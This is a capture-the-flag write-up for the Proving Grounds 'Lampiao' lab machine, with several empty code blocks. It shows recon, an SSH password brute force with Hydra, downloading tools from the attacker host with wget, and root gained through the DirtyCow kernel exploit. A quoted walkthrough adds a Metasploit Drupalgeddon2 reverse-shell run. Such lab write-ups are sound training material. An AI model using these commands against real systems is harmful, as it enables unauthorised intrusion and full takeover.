---
title: Lampiao
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ nmap -Pn -p- -sCV -sS -A -oN full-tcp_scan.txt --open 192.168.201.48
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-16 14:15 +0900
Nmap scan report for 192.168.201.48
Host is up (0.086s latency).
Not shown: 65487 closed tcp ports (reset), 45 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp   open  http?
| fingerprint-strings: 
|   X11Probe: 
|     _____ _ _ 
|     |_|/ ___ ___ __ _ ___ _ _ 
|     \x20| __/ (_| __ \x20|_| |_ 
|     ___/ __| |___/ ___|__,_|___/__, ( ) 
|     |___/ 
|     ______ _ _ _ 
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Lampi\xC3\xA3o
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.99%I=7%D=5/16%Time=6A07FDC8%P=x86_64-pc-linux-gnu%r(X11P
SF:robe,1179,"\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20
SF:\(\x20\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20
SF:\x20__\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n\x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x2
SF:0_`\x20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x
SF:20_\|\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\
SF:__\x20\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\
SF:__\|\x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x
SF:20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\
SF:|\n\|\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\
SF:x20__\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\
SF:x20\x20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/
SF:\x20_`\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x
SF:20\x20/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\
SF:|\x20\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x
SF:20\|\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x
SF:20\|_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|
SF:\\__,_\|_\|\x20\|_\|");
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   83.84 ms 192.168.45.1
2   83.83 ms 192.168.45.254
3   83.71 ms 192.168.251.1
4   84.03 ms 192.168.201.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.19 seconds
```
![](../../../assets/images/Pasted%20image%2020260516142647.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ whatweb -a 3 http://192.168.201.48:1898
http://192.168.201.48:1898 [200 OK] Apache[2.4.7], Content-Language[en], Country[RESERVED][ZZ], Drupal[7.54], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.201.48], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.5.9-1ubuntu4.24], PasswordField[pass], Script[text/javascript], Title[Lampião], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.5.9-1ubuntu4.24]
```

https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py

![](../../../assets/images/Pasted%20image%2020260516164013.png)
tiago

![](../../../assets/images/Pasted%20image%2020260516164118.png)
eder

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ cat users.txt 
tiago
eder
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ cewl http://192.168.201.48:1898 -w cewl-keywords.txt
```

---

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ hydra -L users.txt -P cewl-keywords.txt ssh://192.168.201.48
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-16 16:47:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1696 login tries (l:2/p:848), ~106 tries per task
[DATA] attacking ssh://192.168.201.48:22/
[22][ssh] host: 192.168.201.48   login: tiago   password: Virgulino
[STATUS] 1007.00 tries/min, 1007 tries in 00:01h, 690 to do in 00:01h, 15 active                                                          
[STATUS] 662.50 tries/min, 1325 tries in 00:02h, 372 to do in 00:01h, 15 active                                                           
[STATUS] 553.67 tries/min, 1661 tries in 00:03h, 38 to do in 00:01h, 13 active                                                            
1 of 1 target successfully completed, 1 valid password found                                                                              
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-16 16:50:38
```

```zsh
tiago@lampiao:~$ ls
local.txt
tiago@lampiao:~$ cat local.txt
4da04c66e6d3be5d516d1999f453bac8
tiago@lampiao:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:c4:60 brd ff:ff:ff:ff:ff:ff
    inet 192.168.201.48/24 brd 192.168.201.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:c460/64 scope link 
       valid_lft forever preferred_lft forever
```

```zsh

```

```zsh

```
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                            
                              ╚════════════════════╝                                                                                                          
╔══════════╣ Operative system (T1082)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                             
Linux version 4.4.0-31-generic (buildd@lgw01-01) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016     
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.5 LTS
Release:        14.04
Codename:       trusty
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ cp /usr/share/linux-exploit-suggester/linux-exploit-suggester.sh .
```

```zsh
tiago@lampiao:/tmp$ wget http://192.168.45.240:8000/linux-exploit-suggester.sh
--2026-05-16 18:24:01--  http://192.168.45.240:8000/linux-exploit-suggester.sh
Connecting to 192.168.45.240:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 83454 (81K) [application/x-sh]
Saving to: ‘linux-exploit-suggester.sh’

100%[=======================================================================>] 83,454       451KB/s   in 0.2s   

2026-05-16 18:24:01 (451 KB/s) - ‘linux-exploit-suggester.sh’ saved [83454/83454]
```

```zsh
tiago@lampiao:/tmp$ chmod +x linux-exploit-suggester.sh 
tiago@lampiao:/tmp$ ./linux-exploit-suggester.sh 

Available information:


[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```
dirtycow2

```zsh
tiago@lampiao:/tmp$ ls
40847.cpp  vmware-root
tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
tiago@lampiao:/tmp$ ./dirtycow2 
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
tiago@lampiao:/tmp$ id
uid=1000(tiago) gid=1000(tiago) groups=1000(tiago)
```

```zsh
tiago@lampiao:/tmp$ su -
Password: 
root@lampiao:~# id
uid=0(root) gid=0(root) groups=0(root)
root@lampiao:~# cat /root/proof.txt 
a584c352ca1db410e9133c894023e976
root@lampiao:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:30:ba brd ff:ff:ff:ff:ff:ff
    inet 192.168.214.48/24 brd 192.168.214.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:30ba/64 scope link 
       valid_lft forever preferred_lft forever
```


<details markdown="1">
<summary>Walkthrough</summary>


```zsh
Walkthrough
Close
Exploitation Guide for Lampiao
Summary
This machine is exploited via a remote code execution vulnerability in a Drupal 7 web application. It is escalated with a local exploit for the vulnerable OS kernel version.

Enumeration
Nmap
We start off by running an nmap scan against all 65535 TCP ports:

kali@kali:~$ sudo nmap -p- -T4 192.168.54.48
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-16 20:19 SAST

Nmap scan report for 192.168.54.48
Host is up (0.24s latency).
Not shown: 65470 closed ports, 62 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1898/tcp open  cymtec-port
Let’s run an aggressive scan against the service on port 1898:

kali@kali:~$ sudo nmap -A -p1898 192.168.54.48
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-05 10:14 EST
Nmap scan report for 192.168.54.48
Host is up (0.028s latency).
Not shown: 65370 closed ports, 162 filtered ports
PORT     STATE SERVICE VERSION

1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|/http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|//LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Lampi\xC3\xA3o
...
The results indicate that the app is powered by Drupal 7. Now that we have a target application, we can go ahead and start up our Metasploit Console and search for any Drupal entries:

kali@kali:~$ msfconsole
...
msf6 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ——                                           ———————  ——       ——  —————
   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
Exploitation
DrupalGeddon2
We are going to use DrupalGeddon2 as our attack vector against this target:

msf6 > use 4
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show payloads

Compatible Payloads
===================

   #   Name                                Disclosure Date  Rank    Check  Description
   -   ——                                ———————  ——    ——  —————
...
   16  php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
...
We will select the php/meterpreter/reverse_tcp_uuid payload and set the MSF console options as follows:

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.120.42   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        1898             yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp_uuid):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.118.2    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)
After we run the exploit, we can see that we have received our initial reverse shell into the target:

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.118.2:4444 
[*] Sending stage (39282 bytes) to 192.168.120.42
[*] Meterpreter session 1 opened (192.168.118.2:4444 -> 192.168.120.42:50386) at 2020-12-22 08:20:53 -0500

meterpreter > shell
Process 1361 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@lampiao:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Escalation
Kernel Version Enumeration
Let's check the kernel version of the target:

www-data@lampiao:/var/www/html$ uname -a
uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
Looking up local privilege escalation exploits for this kernel leads us to the DirtyCow exploit.

DirtyCow Privilege Escalation
We can host the C++ source code file over HTTP and then download it to the target:

kali@kali:~$ sudo python3 -m http.server 80                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
...
www-data@lampiao:/var/www/html$ cd /tmp
cd /tmp
www-data@lampiao:/tmp$ wget http://192.168.118.2/40847.cpp
wget http://192.168.118.2/40847.cpp
--2020-12-22 11:25:41--  http://192.168.118.2/40847.cpp
Connecting to 192.168.118.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10531 (10K) [text/x-c++src]
Saving to: '40847.cpp'

100%[======================================>] 10,531      --.-K/s   in 0s      

2020-12-22 11:25:41 (112 MB/s) - '40847.cpp' saved [10531/10531]
After we compile the source code with g++, give it executable permissions, and run the exploit, the root user's password is set to dirtyCowFun:

www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow 40847.cpp -lutil
<-Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow 40847.cpp -lutil        
www-data@lampiao:/tmp$ chmod 777 dirtycow
chmod 777 dirtycow
www-data@lampiao:/tmp$ ./dirtycow
./dirtycow
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
We can now use this password to log in as root:

www-data@lampiao:/tmp$ su
su
Password: dirtyCowFun

root@lampiao:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

</details>